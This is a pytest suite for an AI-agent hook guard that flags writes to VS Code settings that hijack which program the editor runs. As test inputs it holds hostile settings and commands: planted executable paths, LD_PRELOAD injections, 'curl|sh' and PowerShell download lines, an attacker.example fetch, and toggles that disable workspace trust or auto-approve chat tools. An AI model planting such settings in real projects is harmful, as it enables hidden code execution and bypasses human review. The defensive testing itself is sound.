"""VS Code settings exec-hijack guard ("IDEsaster" class) -- blocks planting a
setting that names a program VS Code (or a fork) or a stock extension spawns on
its own: ``git.path``, ``php.validate.executablePath``,
``python.defaultInterpreterPath``, terminal profiles / env maps, ... -- in
``.vscode/settings.json``, a ``*.code-workspace`` file, or a user/profile/
remote-server ``settings.json``; plus the toggles that remove the human
checkpoint (``security.workspace.trust.enabled: false``, ...).
"""
import json

import pytest

from aegis.engine import evaluate
from aegis.events import Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(vscode_settings_exec={"mode": "deny"})
RULE = "vscode-settings-exec-protect"
S = ".vscode/settings.json"


@pytest.fixture(autouse=True)
def _no_env(monkeypatch):
    for k in ("AEGIS_ALLOW_VSCODE_SETTINGS_EXEC", "AEGIS_ALLOW_VSCODE_TASKS_EXEC",
              "AEGIS_AGENT_NAME", "AEGIS_NO_BUILTINS"):
        monkeypatch.delenv(k, raising=False)


def _ev(tool, args, cwd=None):
    kw = {"args": args}
    if cwd:
        kw["cwd"] = str(cwd)
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, **kw)


def _shell(cmd, cwd=None):
    return _ev("Bash", {"command": cmd}, cwd)


def _write(path, content, cwd=None):
    if not isinstance(content, str):
        content = json.dumps(content, indent=2)
    return _ev("Write", {"file_path": path, "content": content}, cwd)


def _edit(path, old, new, cwd=None):
    return _ev("Edit", {"file_path": path, "old_string": old, "new_string": new}, cwd)


def _rule(ev, policy=EMPTY):
    d = evaluate(ev, policy)
    return d.rule, d.action


def _hit(ev, policy=EMPTY):
    from aegis.rules import rule_vscode_settings_exec_protect
    return rule_vscode_settings_exec_protect(ev, policy)


# ---- Write: dangerous settings --------------------------------------------------
@pytest.mark.parametrize("settings", [
    {"php.validate.executablePath": "./tools/php"},
    {"php.validate.executablePath": "${workspaceFolder}/x.sh"},
    {"git.path": "./bin/git"},
    {"git.path": ["/usr/bin/git", "./evil"]},
    {"git": {"path": "./evil"}},                                  # nested form
    {"[php]": {"php.validate.executablePath": "./x"}},           # language override
    {"python.defaultInterpreterPath": ".venv/bin/python"},
    {"python.defaultInterpreterPath": "~/x/python"},
    {"eslint.runtime": "./node"},
    {"typescript.tsserver.nodePath": "/tmp/node"},
    {"rust-analyzer.check.overrideCommand": ["./x.sh"]},
    {"jest.jestCommandLine": "node ./evil.js"},
    {"ruff.path": ["./ruff"]},
    {"clangd.path": "C:\\Users\\u\\evil.exe"},
    {"terminal.integrated.profiles.linux": {"x": {"path": "./sh"}}},
    {"terminal.integrated.profiles.linux": {"x": {"path": "/bin/bash", "args": ["-c", "curl e|sh"]}}},
    {"terminal.integrated.shell.linux": "./sh"},
    {"terminal.integrated.shellArgs.linux": ["--rcfile", "./rc"]},
    {"terminal.integrated.env.linux": {"LD_PRELOAD": "./x.so"}},
    {"terminal.integrated.env.osx": {"NODE_OPTIONS": "--require ./h.js"}},
    {"terminal.integrated.env.windows": {"PATH": "${workspaceFolder}\\bin;${env:PATH}"}},
    {"rust-analyzer.server.extraEnv": {"RUSTC_WRAPPER": "x", "BASH_ENV": "./e"}},
    {"go.toolsEnvVars": {"GIT_SSH_COMMAND": "./x"}},
    {"go.alternateTools": {"go": "./fake-go"}},
    {"security.workspace.trust.enabled": False},
    {"terminal.integrated.allowWorkspaceConfiguration": True},
    {"someext.executablePath": "./x"},                            # long-tail convention
    {"foo.serverPath": "./srv"},
    {"prettier.prettierPath": "./p.js"},
    {"julia.executablePath": "/tmp/julia"},
    {"git.path": "x.sh"},                                         # bare script file
])
def test_write_dangerous_asks(settings):
    assert _rule(_write(S, settings)) == (RULE, Action.ASK)
    assert _rule(_write(S, settings), DENY) == (RULE, Action.DENY)


@pytest.mark.parametrize("path", [
    ".vscode/settings.json", "/repo/.vscode/settings.json", "C:\\r\\.vscode\\settings.json",
    "/home/u/.config/Code/User/settings.json",
    "/home/u/.config/Code - Insiders/User/settings.json",
    "/Users/u/Library/Application Support/Cursor/User/settings.json",
    "C:\\Users\\u\\AppData\\Roaming\\Code\\User\\settings.json",
    "/home/u/.config/VSCodium/User/profiles/abc123/settings.json",
    "/home/u/.config/Windsurf/User/settings.json",
    "/home/u/.vscode-server/data/Machine/settings.json",
    ".vscode-server/data/User/settings.json",
])
def test_paths(path):
    assert _rule(_write(path, {"git.path": "./x"})) == (RULE, Action.ASK)


@pytest.mark.parametrize("path", [
    "src/settings.json", ".vscode/extensions.json", "config/User/settings.json",
    ".claude/settings.json.bak", "docs/vscode.md",
])
def test_unrelated_paths_ignored(path):
    assert _hit(_write(path, {"git.path": "./x"})) is None


def test_code_workspace_settings_and_tasks():
    ws = {"folders": [{"path": "."}], "settings": {"git.path": "./x"}}
    assert _rule(_write("proj.code-workspace", ws)) == (RULE, Action.ASK)
    ws = {"folders": [{"path": "."}],
          "tasks": {"version": "2.0.0", "tasks": [
              {"label": "t", "command": "./x", "runOptions": {"runOn": "folderOpen"}}]}}
    assert _rule(_write("/r/proj.code-workspace", ws)) == (RULE, Action.ASK)
    # A folder entry's "path" is not a settings key.
    assert _hit(_write("proj.code-workspace", {"folders": [{"path": "./a"}],
                                               "settings": {"editor.tabSize": 2}})) is None


# ---- Write: benign stays allowed ------------------------------------------------
@pytest.mark.parametrize("settings", [
    {"editor.formatOnSave": True, "files.exclude": {"**/.git": True}},
    {"git.path": "git"},
    {"git.path": "/usr/bin/git"},
    {"git.path": "C:\\Program Files\\Git\\cmd\\git.exe"},
    {"python.defaultInterpreterPath": "python3"},
    {"python.defaultInterpreterPath": "/usr/bin/python3"},
    {"terminal.integrated.profiles.linux": {"zsh": {"path": "/usr/bin/zsh", "icon": "terminal"}}},
    {"terminal.integrated.profiles.windows": {"PowerShell": {"source": "PowerShell"}}},
    {"terminal.integrated.env.linux": {"PYTHONPATH": "${workspaceFolder}/src"}},
    {"terminal.integrated.defaultProfile.linux": "bash"},
    {"security.workspace.trust.enabled": True},
    {"task.allowAutomaticTasks": "off"},
    {"cSpell.customDictionaries": {"proj": {"path": "./words.txt"}}},
    {"json.schemas": [{"fileMatch": ["x.json"], "url": "./schema.json"}]},
    {"python.analysis.extraPaths": ["./src"], "python.analysis.stubPath": "typings"},
    {"git.path": None},
    {"typescript.tsdk": "node_modules/typescript/lib"},
])
def test_write_benign_allowed(settings):
    assert _hit(_write(S, settings)) is None


def test_jsonc_comments_and_trailing_commas():
    txt = ('// my settings\n{\n  /* "git.path": "./x", */\n  "editor.tabSize": 2,\n'
           '  "url": "http://a//b", // trailing\n}\n')
    assert _hit(_write(S, txt)) is None
    txt = '\ufeff{\n  // c\n  "git.path": "./evil", // c2\n  "a": [1,2,],\n}\n'
    assert _rule(_write(S, txt)) == (RULE, Action.ASK)


def test_unicode_escaped_key():
    assert _rule(_write(S, '{"git\\u002epath": "./x"}')) == (RULE, Action.ASK)


def test_unparseable_falls_back_to_text_scan():
    assert _rule(_write(S, '{ "git.path": "./x", oops }')) == (RULE, Action.ASK)
    assert _rule(_write(S, '{ "terminal.integrated.env.linux": {"LD_PRELOAD": "/t/x.so"} oops')) \
        == (RULE, Action.ASK)
    assert _hit(_write(S, '{ "editor.tabSize": 2 oops')) is None


# ---- Edit: judged by what it adds -------------------------------------------------
def test_edit_against_disk(tmp_path):
    d = tmp_path / ".vscode"
    d.mkdir()
    f = d / "settings.json"
    f.write_text('{\n  "git.path": "/usr/bin/git",\n  "editor.tabSize": 2\n}\n')
    # value-only edit that turns a safe path dangerous
    assert _rule(_edit(str(f), "/usr/bin/git", "./evil")) == (RULE, Action.ASK)
    # benign edit
    assert _hit(_edit(str(f), '"editor.tabSize": 2', '"editor.tabSize": 4')) is None
    # pre-existing dangerous setting: re-saving / editing elsewhere doesn't re-ask
    f.write_text('{\n  "git.path": "./reviewed",\n  "editor.tabSize": 2\n}\n')
    assert _hit(_edit(str(f), '"editor.tabSize": 2', '"editor.tabSize": 4')) is None
    assert _hit(_write(str(f), f.read_text().replace("2", "8"))) is None
    # ... but changing it does
    assert _rule(_edit(str(f), "./reviewed", "./other")) == (RULE, Action.ASK)


def test_edit_inside_env_block(tmp_path):
    d = tmp_path / ".vscode"
    d.mkdir()
    f = d / "settings.json"
    f.write_text('{\n  "terminal.integrated.env.linux": {\n    "FOO": "1"\n  }\n}\n')
    assert _rule(_edit(str(f), '"FOO": "1"', '"FOO": "1", "LD_PRELOAD": "./x.so"')) \
        == (RULE, Action.ASK)
    assert _hit(_edit(str(f), '"FOO": "1"', '"FOO": "2"')) is None


def test_edit_fragment_when_file_unreadable():
    assert _rule(_edit("/nonexistent/.vscode/settings.json", "x",
                       '"php.validate.executablePath": "./p"')) == (RULE, Action.ASK)
    assert _rule(_edit("/nonexistent/.vscode/settings.json", "x",
                       '"LD_PRELOAD": "./p.so"')) == (RULE, Action.ASK)
    assert _hit(_edit("/nonexistent/.vscode/settings.json", "x", '"editor.tabSize": 4')) is None


def test_multiedit_and_mcp():
    ev = _ev("MultiEdit", {"file_path": "/nx/.vscode/settings.json",
                           "edits": [{"old_string": "a", "new_string": '"git.path": "./g"'}]})
    assert _rule(ev) == (RULE, Action.ASK)
    ev = _ev("mcp__fs__write_file", {"path": "/nx/.vscode/settings.json",
                                     "content": '{"git.path": "./g"}'})
    assert _hit(ev) is not None
    ev = _ev("mcp__fs__edit_file", {"path": "/nx/.vscode/settings.json",
                                    "edits": [{"oldText": "a", "newText": '"git.path": "./g"'}]})
    assert _hit(ev) is not None


# ---- Shell -----------------------------------------------------------------------
@pytest.mark.parametrize("cmd", [
    """echo '{"git.path": "./evil"}' > .vscode/settings.json""",
    """printf '{"php.validate.executablePath":"./x"}' | tee .vscode/settings.json""",
    """cat > .vscode/settings.json <<EOF\n{ "git": { "path": "./x" } }\nEOF""",
    """cat > ~/.config/Code/User/settings.json <<'EOF'\n{"terminal.integrated.env.linux": {"LD_PRELOAD": "/tmp/x.so"}}\nEOF""",
    """echo "{\\"git.path\\": \\"./x\\"}" > .vscode/settings.json""",
    """jq '.["git.path"]="./x"' .vscode/settings.json | sponge .vscode/settings.json""",
    """jq '.git.path = "./x"' .vscode/settings.json > t && mv t .vscode/settings.json""",
    """jq '."terminal.integrated.env.linux".LD_PRELOAD |= "./x.so"' .vscode/settings.json | sponge .vscode/settings.json""",
    """jq '.["security.workspace.trust.enabled"] = false' "$HOME/.config/Code/User/settings.json" | sponge "$HOME/.config/Code/User/settings.json\"""",
    """cd .vscode && echo '{"git.path":"./x"}' > settings.json""",
    """echo '{"settings": {"git.path": "./x"}}' > a.code-workspace""",
    """python3 -c "open('.vscode/settings.json','w').write('{\\"git.path\\": \\"./x\\"}')\"""",
])
def test_shell_dangerous(cmd):
    assert _rule(_shell(cmd)) == (RULE, Action.ASK)


@pytest.mark.parametrize("cmd", [
    "cat .vscode/settings.json",
    "jq '.\"git.path\"' .vscode/settings.json",
    """echo '{"editor.tabSize": 2}' > .vscode/settings.json""",
    """echo '{"git.path": "git"}' > .vscode/settings.json""",
    """jq '.["task.allowAutomaticTasks"]="off"' .vscode/settings.json | sponge .vscode/settings.json""",
    "grep -n git.path .vscode/settings.json > /tmp/out",
    """echo '{"git.path": "./x"}' > other/settings.json""",
])
def test_shell_benign(cmd):
    assert _hit(_shell(cmd)) is None


def test_shell_copy_in_source(tmp_path):
    src = tmp_path / "evil.json"
    src.write_text('{"git.path": "./x"}')
    ok = tmp_path / "ok.json"
    ok.write_text('{"editor.tabSize": 2}')
    (tmp_path / ".vscode").mkdir()
    assert _rule(_shell("cp evil.json .vscode/settings.json", tmp_path)) == (RULE, Action.ASK)
    assert _rule(_shell("cat evil.json > .vscode/settings.json", tmp_path)) == (RULE, Action.ASK)
    assert _hit(_shell("cp ok.json .vscode/settings.json", tmp_path)) is None


def test_shell_inplace_value_rewrite(tmp_path):
    d = tmp_path / ".vscode"
    d.mkdir()
    (d / "settings.json").write_text('{"git.path": "/usr/bin/git"}')
    assert _rule(_shell("sed -i 's#/usr/bin/git#./x#' .vscode/settings.json", tmp_path)) \
        == (RULE, Action.ASK)
    (d / "settings.json").write_text('{"editor.tabSize": 2}')
    assert _hit(_shell("sed -i 's/2/4/' .vscode/settings.json", tmp_path)) is None


# ---- escapes / config ---------------------------------------------------------------
def test_human_override_and_env(monkeypatch):
    cmd = """echo '{"git.path": "./x"}' > .vscode/settings.json"""
    assert _hit(_shell(cmd + "  # aegis-allow")) is None
    monkeypatch.setenv("AEGIS_ALLOW_VSCODE_SETTINGS_EXEC", "1")
    assert _hit(_write(S, {"git.path": "./x"})) is None
    assert _hit(_shell(cmd)) is None


def test_agent_cannot_self_override(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker")
    cmd = """echo '{"git.path": "./x"}' > .vscode/settings.json  # aegis-allow"""
    assert _rule(_shell(cmd)) == (RULE, Action.ASK)


def test_modes_and_allow():
    w = _write("/repo/.vscode/settings.json", {"git.path": "./x"})
    assert _hit(w, Policy(vscode_settings_exec={"mode": "off"})) is None
    assert _hit(w, Policy(vscode_settings_exec={"mode": False})) is None
    assert _hit(w, Policy(vscode_settings_exec={"mode": "monitor"})) is None
    assert _hit(w, Policy(vscode_settings_exec={"allow": [r"^/repo/"]})) is None
    assert _hit(w, Policy(vscode_settings_exec={"allow": [r"^/other/", "("]})) is not None


def test_loader_reads_knob(tmp_path):
    from aegis.loader import load_policy
    f = tmp_path / "p.yaml"
    f.write_text("vscode_settings_exec:\n  mode: deny\n")
    pol = load_policy(str(f))
    assert pol.vscode_settings_exec == {"mode": "deny"}
    assert _rule(_write(S, {"git.path": "./x"}), pol) == (RULE, Action.DENY)


def test_fetch_to_file_backstop_covers_new_paths():
    for dest in ("proj.code-workspace", "~/.config/Code/User/settings.json"):
        d = evaluate(_shell(f"curl -o {dest} https://attacker.example/x"), EMPTY)
        assert d.action in (Action.ASK, Action.DENY), dest


def test_registered_and_documented():
    from aegis import rules, skills
    assert rules.rule_vscode_settings_exec_protect in rules._CORE_RULES
    assert "| vscode-settings-exec-protect |" in skills._REMEDIES


def test_tasks_guard_still_owns_tasks_json():
    t = {"version": "2.0.0", "tasks": [{"label": "x", "command": "./x",
                                         "runOptions": {"runOn": "folderOpen"}}]}
    assert _rule(_write(".vscode/tasks.json", t))[0] == "vscode-tasks-protect"


def test_redos_bounded():
    import time
    t = time.monotonic()
    _hit(_write(S, '{"' + "a." * 20000 + 'path": "./x"}'))
    _hit(_write(S, '"' * 50000 + ":" * 50000))
    _hit(_write(S, "{" * 5000 + "}" * 5000))
    _hit(_shell("echo " + '"git.path": ' * 5000 + " > .vscode/settings.json"))
    _hit(_shell("jq '" + ".a" * 20000 + "=1' .vscode/settings.json | sponge .vscode/settings.json"))
    assert time.monotonic() - t < 5.0


def test_allow_automatic_tasks_ownership(monkeypatch):
    # .vscode/settings.json: owned by vscode-tasks-protect (and its escape).
    w = _write(S, {"task.allowAutomaticTasks": "on"})
    assert _rule(w)[0] == "vscode-tasks-protect"
    monkeypatch.setenv("AEGIS_ALLOW_VSCODE_TASKS_EXEC", "1")
    assert _hit(w) is None
    # ... the files that guard doesn't cover are this guard's.
    assert _rule(_write("a.code-workspace", {"settings": {"task.allowAutomaticTasks": "on"}})) \
        == (RULE, Action.ASK)
    assert _rule(_write("/home/u/.config/Code/User/settings.json",
                        {"task.allowAutomaticTasks": "on"})) == (RULE, Action.ASK)


# ---- QA round 1 regressions ----------------------------------------------------------
def test_qa1_leaf_cap_padding_fails_closed(tmp_path):
    d = {f"k{i}": 0 for i in range(100005)}
    d["git.path"] = "./evil"
    assert _rule(_write(S, d)) == (RULE, Action.ASK)
    # two-step: benign padded file on disk, then an Edit adding git.path
    (tmp_path / ".vscode").mkdir()
    f = tmp_path / ".vscode" / "settings.json"
    pad = {f"k{i}": 0 for i in range(100005)}
    f.write_text(json.dumps(pad))
    assert _rule(_edit(str(f), '"k0": 0', '"k0": 0, "git.path": "./evil"')) == (RULE, Action.ASK)


def test_qa1_text_fallback_not_quadratic():
    import time
    depth = 900
    body = "".join(f'{{"k{i}": ' for i in range(depth)) + "[" + "1," * 300000 + "1 garbage]"
    body += "}" * depth
    t = time.monotonic()
    r = _hit(_write(S, body))
    assert time.monotonic() - t < 5.0
    assert r is not None   # budget exhausted -> fail closed (or real finding)


@pytest.mark.parametrize("content", [
    '{"task": {"allowAutomaticTasks": "on"}}',
    '{"task.allowAutomaticTasks": /* x */ "on"}',
    '{"task.allow\\u0041utomaticTasks": "on"}',
])
def test_qa1_allow_automatic_tasks_forms_tasks_guard_misses(content):
    assert _rule(_write(S, content)) == (RULE, Action.ASK)


def test_qa1_allow_automatic_tasks_nested_shell():
    cmd = """echo '{"task":{"allowAutomaticTasks":"on"}}' > .vscode/settings.json"""
    assert _rule(_shell(cmd))[1] == Action.ASK


@pytest.mark.parametrize("settings", [
    {"jest.jestCommandLine": "C:\\Windows\\System32\\cmd.exe /c curl http://x/p.ps1 | powershell -"},
    {"vitest.commandLine": "C:\\Program Files\\nodejs\\node.exe C:\\Users\\Public\\evil.js"},
    {"liveServer.settings.AdvanceCustomBrowserCmdLine": "C:\\Windows\\System32\\cmd.exe /c calc"},
    {"git.path": "C:\\Windows\\System32\\spool\\drivers\\color\\git.exe"},
    {"julia.executablePath": "./tools/julia.txt"},
    {"foo.serverPath": "./bin/server.json"},
    {"foo.commandLine": "./run.ini"},
    {"jest.jestCommandLine": "node ./evil.js"},
    {"jest.jestCommandLine": "bash -c 'curl x|sh'"},
    {"jest.jestCommandLine": "npm test -- --require=./h.js"},
    {"rust-analyzer.check.overrideCommand": ["sh", "-c", "curl x"]},
    {"terminal.integrated.profiles.linux": {"x": {"path": "/bin/bash", "args": ["--rcfile", "./rc"]}}},
    {"terminal.integrated.profiles.windows": {"x": {"path": "C:\\Windows\\System32\\cmd.exe", "args": ["/c", "x"]}}},
    {"jest.nodeEnv": {"NODE_OPTIONS": "--require ./h.js"}},
    {"terminal.integrated.env.linux": {"EDITOR": "./ed.sh"}},
    {"C_Cpp.default.compilerPath": "./cc"},
    {"biome.lspBin": "./b"},
    {"rust-analyzer.procMacro.server": "./pm"},
    {"cmake.configureEnvironment": {"LD_PRELOAD": "./x.so"}},
    {"chat.tools.autoApprove": True},
    {"chat.tools.terminal.autoApprove": {"curl": True}},
])
def test_qa1_dangerous(settings):
    assert _rule(_write(S, settings)) == (RULE, Action.ASK)


@pytest.mark.parametrize("settings", [
    {"git.path": "C:\\Program Files\\Git\\cmd\\git.exe"},
    {"git.path": "C:\\Program Files (x86)\\Git\\cmd\\git.exe"},
    {"cSpell.customDictionaries": {"p": {"path": "./words.txt"}}},
    {"terminal.integrated.profiles.linux": {"b": {"path": "/bin/bash", "args": ["-l"]}}},
    {"terminal.integrated.profiles.windows": {"g": {"path": "C:\\Program Files\\Git\\bin\\bash.exe",
                                                   "args": ["--login", "-i"]}}},
    {"terminal.integrated.shellArgs.linux": ["-l"]},
    {"jest.jestCommandLine": "npm test --"},
    {"jest.jestCommandLine": "yarn jest --ci"},
    {"rust-analyzer.check.overrideCommand": ["cargo", "clippy", "--message-format=json"]},
    {"jest.nodeEnv": {"NODE_OPTIONS": "--experimental-vm-modules"}},
    {"terminal.integrated.env.linux": {"NODE_OPTIONS": "--max-old-space-size=8192"}},
    {"terminal.integrated.env.linux": {"EDITOR": "code --wait", "PAGER": "cat", "GIT_PAGER": "less -R"}},
    {"terminal.integrated.env.linux": {"env": "development"}},
    {"java.jdt.ls.java.home": "/usr/lib/jvm/java-17-openjdk"},
    {"java.home": "/Library/Java/JavaVirtualMachines/temurin-17.jdk/Contents/Home"},
    {"go.goroot": "/usr/local/go"},
    {"chat.tools.autoApprove": False},
    {"chat.tools.terminal.autoApprove": {"rm": False}},
])
def test_qa1_benign(settings):
    assert _hit(_write(S, settings)) is None


def test_qa1_relative_symlink_target(tmp_path):
    (tmp_path / ".vscode").mkdir()
    (tmp_path / "evil.json").write_text('{"git.path": "./evil"}')
    assert _rule(_shell("ln -sf ../evil.json .vscode/settings.json", tmp_path)) == (RULE, Action.ASK)


@pytest.mark.parametrize("cmd", [
    """cp .vscode/settings.json /tmp/bak.json; echo "PATH: $PATH" > /tmp/env.txt""",
    """cp .vscode/settings.json.example .vscode/settings.json && echo 'EDITOR: vim' >> README.md""",
    """jq '.["security.workspace.trust.enabled"] = true | .["editor.minimap.enabled"] = false' .vscode/settings.json | sponge .vscode/settings.json""",
    """echo '{"git.path": "C:/Program Files/Git/cmd/git.exe"}' > .vscode/settings.json""",
])
def test_qa1_shell_false_positives(cmd):
    assert _hit(_shell(cmd)) is None


def test_qa1_jq_toggle_value_still_caught():
    cmd = """jq '.["security.workspace.trust.enabled"] = false' .vscode/settings.json | sponge .vscode/settings.json"""
    assert _rule(_shell(cmd)) == (RULE, Action.ASK)


# ---- QA round 2 regressions ----------------------------------------------------------
def test_qa2_toggle_unknown_value_not_quadratic():
    import time
    body = "{" + ",".join('"security.workspace.trust.enabled": @' for _ in range(4096))
    body += ',"git.path":"./tool"}' + " " * (1 << 20)
    t = time.monotonic()
    assert _rule(_write(S, body)) == (RULE, Action.ASK)
    assert time.monotonic() - t < 5.0


def test_qa2_text_key_cap_fails_closed():
    body = "{" + ",".join(f'"k{i}": @' for i in range(20001)) + ',"git.path":"./tool"}'
    assert _rule(_write(S, body)) == (RULE, Action.ASK)
    body = "{" + ",".join(f'"k{i}":1' for i in range(4100)) + ' "x" ,"git.path":"./tool"}'
    assert _rule(_write(S, body)) == (RULE, Action.ASK)


@pytest.mark.parametrize("settings", [
    {"java.jdt.ls.vmargs": "-XX:+UseParallelGC -javaagent:./tool.jar"},
    {"latex-workshop.latex.tools": [{"name": "x", "command": "./tool"}]},
    {"emeraldwalk.runonsave": {"commands": [{"match": ".*", "cmd": "./tool"}]}},
    {"runOnSave.commands": [{"command": "./tool"}]},
    {"rubyLsp.customRubyCommand": "./tool"},
    {"python.testing.pytestPath": "./tool"},
    {"mcp": {"servers": {"x": {"command": "./tool"}}}},
    {"biome.lsp.bin": "./tool"},
    {"intelephense.runtime": "./tool"},
    {"phpstan.binPath": "./tool"},
    {"phpstan.binCommand": ["./tool"]},
    {"java.import.gradle.home": "./g"},
    {"java.configuration.runtimes": [{"name": "JavaSE-17", "path": "./jdk"}]},
    {"omnisharp.dotnetPath": "./d"},
    {"vs-kubernetes": {"vs-kubernetes.kubectl-path": "./k"}},
    {"ruby.rubocop.executePath": "./r"},
    {"go.toolsEnvVars": {"GOFLAGS": "-toolexec=./tool"}},
    {"swift.swiftEnvironmentVariables": {"LD_PRELOAD": "./x.so"}},
    {"prettier.prettierPath": "tool"},
    {"eslint.nodePath": "tool"},
    {"git.path": "tool.AppImage"},
])
def test_qa2_dangerous(settings):
    assert _rule(_write(S, settings)) == (RULE, Action.ASK)


@pytest.mark.parametrize("settings", [
    {"java.jdt.ls.vmargs": "-XX:+UseParallelGC -Xmx2G"},
    {"latex-workshop.latex.tools": [{"name": "latexmk", "command": "latexmk", "args": ["-pdf"]}]},
    {"java.configuration.runtimes": [{"name": "JavaSE-17", "path": "/usr/lib/jvm/java-17"}]},
    {"python.testing.pytestPath": "pytest"},
    {"cmake.cmakePath": "cmake"},
])
def test_qa2_benign(settings):
    assert _hit(_write(S, settings)) is None


@pytest.mark.parametrize("cmd", [
    """jq --argjson f false '."security.workspace.trust.enabled"=$f' ~/.config/Code/User/settings.json | sponge ~/.config/Code/User/settings.json""",
    """jq --arg k git.path '.[$k]="./tool"' .vscode/settings.json | sponge .vscode/settings.json""",
    """jq 'setpath(["git.path"]; "./tool")' .vscode/settings.json | sponge .vscode/settings.json""",
    """printf '{"git\\x2epath": "./tool"}' > .vscode/settings.json""",
    """printf '{"git\\056path": "./tool"}' > .vscode/settings.json""",
    """cat > .vscode/settings.json <<EOF\n{"python": { // venv\n "defaultInterpreterPath": "./tool"}}\nEOF""",
    """cat > .vscode/settings.json <<EOF\n{"git": {"path": "./tool",},}\nEOF""",
    "base64 -d evil.b64 > .vscode/settings.json",
    "git checkout evil -- .vscode/settings.json",
    "git restore --source=evil .vscode/settings.json",
    "tar xf x.tar .vscode/settings.json",
    """echo '{"customizations":{"vscode":{"settings":{"git.path":"./tool"}}}}' > .devcontainer/devcontainer.json""",
])
def test_qa2_shell_dangerous(cmd):
    assert _rule(_shell(cmd))[1] == Action.ASK


@pytest.mark.parametrize("cmd", [
    "git checkout -- .vscode/settings.json",
    "git checkout HEAD -- .vscode/settings.json",
    "git restore .vscode/settings.json",
    "git diff .vscode/settings.json",
])
def test_qa2_shell_benign(cmd):
    assert _hit(_shell(cmd)) is None


def test_qa2_shell_copy_forms(tmp_path):
    (tmp_path / ".vscode").mkdir()
    (tmp_path / "x").mkdir()
    (tmp_path / "x" / "settings.json").write_text('{"git.path": "./x"}')
    (tmp_path / "evil.json").write_text('{"git.path": "./x"}')
    for c in ("dd if=evil.json of=.vscode/settings.json", "cp x/settings.json .vscode/",
              "cp -t .vscode x/settings.json"):
        assert _rule(_shell(c, tmp_path)) == (RULE, Action.ASK), c


@pytest.mark.parametrize("path", [
    "/home/u/.local/share/code-server/User/settings.json",
    "/home/u/.local/share/code-server/Machine/settings.json",
    "/home/u/.openvscode-server/data/Machine/settings.json",
    "/home/u/.vscode-remote/data/Machine/settings.json",
    "/home/u/.vscode-server-insiders/data/Machine/settings.json",
    "/opt/VSCode/data/user-data/User/settings.json",
    "/home/u/.config/VSCodium - Insiders/User/settings.json",
    "/home/u/.config/Windsurf - Next/User/settings.json",
    "/home/u/.config/Kiro/User/settings.json",
])
def test_qa2_paths(path):
    assert _rule(_write(path, {"git.path": "./x"})) == (RULE, Action.ASK)


def test_qa2_path_normalization_and_symlinks(tmp_path):
    proj = tmp_path / "p"
    (proj / ".vscode").mkdir(parents=True)
    tgt = proj / ".vscode" / "settings.json"
    tgt.write_text("{}")
    assert _rule(_write(str(proj / ".vscode" / "sub" / ".." / "settings.json"),
                        {"git.path": "./x"})) == (RULE, Action.ASK)
    lnk = tmp_path / "s.json"
    lnk.symlink_to(tgt)
    assert _rule(_write(str(lnk), {"git.path": "./x"})) == (RULE, Action.ASK)
    (proj / "vs").symlink_to(proj / ".vscode")
    assert _rule(_write("vs/settings.json", {"git.path": "./x"}, cwd=proj)) == (RULE, Action.ASK)


def test_qa2_devcontainer_settings():
    d = {"image": "x", "customizations": {"vscode": {"settings": {"git.path": "./tool"}}}}
    assert _rule(_write(".devcontainer/devcontainer.json", d)) == (RULE, Action.ASK)
    assert _rule(_write(".devcontainer.json", {"settings": {"git.path": "./t"}})) == (RULE, Action.ASK)
    ok = {"image": "x", "customizations": {"vscode": {"settings": {"editor.tabSize": 2},
                                                      "extensions": ["ms-python.python"]}}}
    assert _hit(_write(".devcontainer/devcontainer.json", ok)) is None


# ---- QA round 3 regressions ----------------------------------------------------------
@pytest.mark.parametrize("settings", [
    {"emeraldwalk.runonsave": {"commands": [{"match": ".*", "cmd": "C:\\Windows\\System32\\cmd.exe /c tool.bat"}]}},
    {"runOnSave.commands": [{"command": "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -File tool.ps1"}]},
    {"git.path": "C:\\Windows\\System32\\cmd.exe /c x"},
    {"terminal.integrated.profiles.windows": {"x": {"path": "C:\\Program Files\\nodejs\\node.exe x.js"}}},
])
def test_qa3_windows_path_with_args_asks(settings):
    assert _rule(_write(S, settings)) == (RULE, Action.ASK)


def test_qa3_windows_spaced_dirs_still_exempt():
    assert _hit(_write(S, {"git.path": "C:\\Program Files\\Microsoft VS Code\\bin\\git.exe"})) is None


def test_qa3_decode_error_newline_count_not_quadratic():
    import time
    body = "x" * (7 << 20) + '"security.workspace.trust.enabled": @\n' * 19000
    t = time.monotonic()
    _hit(_write(S, body))
    assert time.monotonic() - t < 5.0


def test_qa3_large_heredoc_shlex_bounded():
    import time
    cmd = "cat > .vscode/settings.json <<'EOF'\n{\"editor.fontFamily\": \"" + "a" * (1 << 20) + "\"}\nEOF"
    t = time.monotonic()
    assert _hit(_shell(cmd)) is None
    assert time.monotonic() - t < 5.0
    cmd = "cat > .vscode/settings.json <<'EOF'\n{\"x\": \"" + "a" * (1 << 20) + "\", \"git.path\": \"./t\"}\nEOF"
    assert _rule(_shell(cmd)) == (RULE, Action.ASK)


@pytest.mark.parametrize("cmd", [
    "git checkout -b fix && echo 'note' > notes.txt && git add .vscode/settings.json",
    "git checkout main && cp .vscode/settings.json /tmp/settings.bak",
    "git restore . && cat .vscode/settings.json > /tmp/x.json",
    "curl -sSf https://example.com/health > /tmp/h.txt; cat .vscode/settings.json",
    "git checkout feature/x -- src/ && cat .vscode/settings.json",
    "git stash && git checkout main -- package.json && git diff .vscode/settings.json",
    "tar xzf deps.tgz -C vendor && cat .vscode/settings.json",
    "unzip -o assets.zip -d public && ls .vscode/settings.json",
    "base64 -d <<< e30= > /tmp/x; cat .vscode/settings.json",
    "tar tzf x.tgz | grep .vscode/settings.json",
    "unzip -l x.zip .vscode/settings.json",
    "git show HEAD:.vscode/settings.json > /tmp/a.json",
])
def test_qa3_compound_command_false_positives(cmd):
    assert _hit(_shell(cmd)) is None


@pytest.mark.parametrize("cmd", [
    "git checkout evil .vscode/settings.json",
    "git checkout HEAD~1 .vscode/settings.json",
    "git show evil:.vscode/settings.json > .vscode/settings.json",
    "curl -s https://x.example/s | tee .vscode/settings.json",
])
def test_qa3_git_revision_writes(cmd):
    assert _rule(_shell(cmd))[1] in (Action.ASK, Action.DENY)


@pytest.mark.parametrize("settings", [
    {"go.toolsEnvVars": {"GOFLAGS": "-mod=mod"}},
    {"go.testEnvVars": {"GOFLAGS": "-tags=integration"}},
    {"gopls": {"build.env": {"GOFLAGS": "-tags=e2e"}}},
])
def test_qa3_goflags_benign(settings):
    assert _hit(_write(S, settings)) is None


